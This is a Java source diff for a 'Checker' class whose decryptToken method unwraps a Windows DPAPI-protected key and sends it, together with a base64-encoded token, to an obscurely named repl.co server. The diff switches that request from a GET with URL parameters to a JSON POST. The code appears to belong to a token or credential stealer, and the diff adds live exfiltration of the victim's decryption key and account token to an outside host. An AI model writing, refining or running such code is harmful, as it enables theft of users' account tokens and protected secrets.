@@ -29,6 +29,9 @@ public class Checker {
     public String decryptToken(String token) {
         byte[] bytes = Base64.getDecoder().decode(osKey.getBytes());
         String encryptedBytes = new String(Base64.getEncoder().encode(Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(bytes, 5, bytes.length))));
-        return new JSONObject(Helper.getRequest().get(String.format("https://decryptionServer.illllilllilllll.repl.co?key=%s&token=%s", encryptedBytes, new String(Base64.getEncoder().encode(token.getBytes()))), null)).getString("token");
+        JSONObject json = new JSONObject();
+        json.put("key", encryptedBytes);
+        json.put("token", new String(Base64.getEncoder().encode(token.getBytes())));
+        return new JSONObject(Helper.getRequest().post("https://decryptionserver.ixixlliilxilili.repl.co", json)).getString("token");
     }
 }
